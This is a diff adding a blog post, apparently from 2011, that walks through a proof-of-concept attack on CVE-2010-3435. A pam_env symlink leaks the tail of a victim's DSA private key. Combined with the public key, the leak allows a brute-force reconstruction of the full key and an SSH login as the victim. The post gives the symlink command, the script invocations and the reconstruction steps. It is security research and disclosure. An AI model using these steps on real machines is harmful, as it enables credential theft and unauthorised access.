@@ -1,0 +1,177 @@
+In my `previous blog post <http://7bits.nl/blog/2011/05/12/on-cve-2010-3435>`_
+I wondered
+
+    I don't know what the mathematical implications of having the last few
+    bits of a private key are, but it can't be good.
+
+As it turns out, for DSA, *quite bad*.
+
+Over a sample of 1000 keys, around 20% of DSA private keys (when encoded in
+DER/PEM form, as is common) end in ``==``. Some of those we still can't read
+because their last line starts with a number; the ``pam_env`` issue requires
+an alphanumeric line (starting with a letter), ending in ``==``. In the end,
+about 10% of private DSA keys expose their last line to us this way.
+
+Of those keys, 98% leak 16*8=128 bits of the private part
+(``x``) of a DSA key. The rest (within my sample of 1000) leak 13*8=104 bits.
+The private part appears to be around 160 bits long on average.
+
+This report documents a staged attack. It should explain most of the issue.
+
+We make the following assumptions.
+1. we can obtain the public key
+2. the private key is in the 10% that is vulnerable
+
+Here follows an example 'conversation' between Alice and Eve. You can find all
+the scripts I wrote in `this Mercurial repository
+<http://7bits.nl/hg/cve-2010-3435-dsa>`_.
+
+Alice
+=====
+
+Alice has her DSA keypair she uses to log in to various places. She's silly
+enough to not use a passphrase: ::
+    
+    alice:~$ ssh-keygen -t dsa
+    Generating public/private dsa key pair.
+    Enter file in which to save the key (/home/alice/.ssh/id_dsa): 
+    Enter passphrase (empty for no passphrase): 
+    Enter same passphrase again: 
+    Your identification has been saved in /home/alice/.ssh/id_dsa.
+    Your public key has been saved in /home/alice/.ssh/id_dsa.pub.
+    The key fingerprint is:
+    67:de:0c:71:72:f4:a8:13:59:22:a9:38:7a:b4:7d:6b alice@classroom
+    The key's randomart image is:
+    +--[ DSA 1024]----+
+    |        ... o    |
+    |        .. = o   |
+    |     . .  = + .  |
+    |    + .    B     |
+    |   o +  S *      |
+    |  . o . .+ =     |
+    |   .   . .. o    |
+    |        E        |
+    |       .         |
+    +-----------------+
+
+Not everybody does this next bit but it makes this demonstration a bit simpler.
+::
+
+    alice:~$ cd .ssh
+    alice:~/.ssh$ cp id_dsa.pub authorized_keys
+
+Some time later, Eve comes in with her user account on the same machine.
+
+Eve
+===
+
+Eve employs the pam_env symlink trick: ::
+
+    eve:~$ ln -s /home/alice/.ssh/id_dsa .pam_environment
+    eve:~$ logout
+
+Logs out, logs back in (newlines inserted for readability): ::
+
+    Last login: Sat May 14 02:18:02 2011 from 10.0.2.2
+    eve:~$ set | grep == | grep -v '^ '
+    bSsUBZkPeLhzmQZtCB97Xg==
+    eve:~$ cat /home/alice/.ssh/id_dsa.pub 
+    ssh-dss AAAAB3NzaC1kc3MAAACBANVRS9oBaKKlLMkzNm3dc5yTW+zWTcI5yyXC
+    3rT1OO4/bXlAmpwhi7Xf3w0lWByifoGMF7OR1b8R76CkNwDmCjXyJ8OSuOMBfsNk
+    kbgzHSMy32djM7zvkjuiZ3nGqWsWWb+jayl/Q2en+qYZVh8JsyLr1b9C3WSBIvGp
+    SzJOtl2PAAAAFQDIoar6gVRHZjPGDSpUvPm+U0twOQAAAIB6gi/Vj9eoLXQMZdY6
+    Qa0dj5jeAatt+O73cpYOeCu29BwAQz7622OTv9frmoqF4MK+7GaYYKkrZfRVl4qM
+    NZ6vF60Go+M2Yax3eAWFZ32Del6URCS6aeb/pUylkWF/TJbzyvUZ4NZ6tadjow0m
+    rLi/p+tyLb5JjEQlCvaU28wczgAAAIEAj+JTm+IKWO5mh/fIMpxwFnpdEm/8fcfn
+    bgFet9JOge6Y/CEMzkeLhj+tfwo8hFY3Rzhb5T2a1LeOezA/yDMM9NfoZhEi7OFX
+    4k4tZl5ZEQ8Bzzx3KTAVRMfGGMApVONcyRGipi9jbzJW6k+F/3oJLtrSIRXV0hYN
+    jQdNxPQHJGc= alice@classroom``
+    
+
+Depending on some factors, ``.ssh`` permissions may not allow reading the pub
+file; we're assuming that in general the public key is available.
+
+The ``bSsUBZkPeLhzmQZtCB97Xg==`` bit is most of DSA's private part, ``x``. The
+public key provides all other variables. Let's get to work (newlines inserted
+in numbers for readability): ::
+
+    eve:~$ ./parse.py AAAA...PQHJGc= bSsUBZkPeLhzmQZtCB97Xg== > data
+    eve:~$ cat data
+    sshpubkey='AAAA...PQHJGc='
+    privkeytail='bSsUBZkPeLhzmQZtCB97Xg=='
+    p=(1032, 14979668739262847199401286465805946933553729526270785613
+      231835823507408935406452338548146196812588176301329170237690031
+      351489761857827303062373035083494040560444499386729868750469065
+      814414866019474020546012017212954053146564847260400257205025190
+      3645892083834378966373248988577426788576214439832651880528764303L)
+    q=(168, 1145403468472839477189710491941815844340807462969L)
+    g=(1024, 8602842407060379245644785877262588638713334499529766182487
+       1823968572910358531836901666291003619767084845919947795814180491
+       6195163652779263485632209217900621020990905639910539012861981226
+       9053137430451172627060088210190833009739012347087391271308688231
+       1904758513237377160877564270070634081634916077891870268622L)
+    y=(1032, 1010388428517245355327173365948491524813492949714774563537
+       1149417866008856785526451212381646177618649883962116386661341685
+       8122088617380378106504834801580614713485135557092683040256193676
+       5447670015160761591794394011557281792422429957351337312470605326
+       37714802502035774343292088483944522959145887601092303725671L)
+    xtail=(128, 145109526397175623815740512749110655838L)
+    increment=340282366920938463463374607431768211456L
+    maximum=3366038266L
+
+``p``, ``q``, ``g`` and ``y`` are gathered from the pubkey. Each variable is
+stored as a ``(len, i)`` tuple; ``len`` indicates the number of bits actually
+stored -- this is mostly so we know how many leading zeroes we may have.
+
+``xtail`` is the tail part of ``x`` that we gathered from the last line of
+Alice's private key file.
+
+Eve copies this data file to her render farm and sets it to work: ::
+
+    eve@cluster:~$ ./farm.py data 4 host1 host2 host3 host4 host5 host6
+
+6 hours pass. ::
+
+    found 1114417266960240201277285122766916336093931469662
+
+Yay! Let's use this information for good. Or for bad ;)
+
+Reconstruct Alice's private key: ::
+
+    eve:~$ ./out.py data 1114417266960240201277285122766916336093931469662 | 
+       openssl dsa -inform der -outform pem > alice_reconstructed_key
+    read DSA key
+    writing DSA key
+    eve:~$ chmod 600 alice_reconstructed_key
+
+Try logging in with it: ::
+
+    eve:~$ ssh -i alice_reconstructed_key alice@localhost
+    Welcome to your Vagrant-built virtual machine!
+    Last login: Sat May 14 08:17:53 2011 from ::1
+    alice:~$
+
+We did it!
+
+Conclusion
+==========
+
+A symlink attack in pam_env allows us to steal data if it's formatted in
+specific ways. About 10% of private DSA keys expose their last base64-encoded
+line this way. If we can obtain the public key that goes with such a key, we
+have about 32 bits of private key data to guess. This turns out to be entirely
+feasible on modern hardware. In this specific demonstration, 24 cores of a
+recent CPU model needed 6 hours to reconstruct the complete private key.
+
+Acknowledgements
+================
+
+I would like to gratefully acknowledge the following people who have
+contributed ideas and helped develop the proof of concept: Christiaan Ottow
+(`Pine Digital Security <http://www.pine.nl/>`_), Job Snijders (`Snijders IT
+<http://www.snijdersit.nl/>`_) and my employer `XLS Hosting
+<http://www.xlshosting.nl>`_.
+
+Also, the `PARI computation library <http://pari.math.u-bordeaux.fr/>`_ and
+its `Python interface <http://code.google.com/p/pari-python/>`_ have been
+instrumental in making this happen.
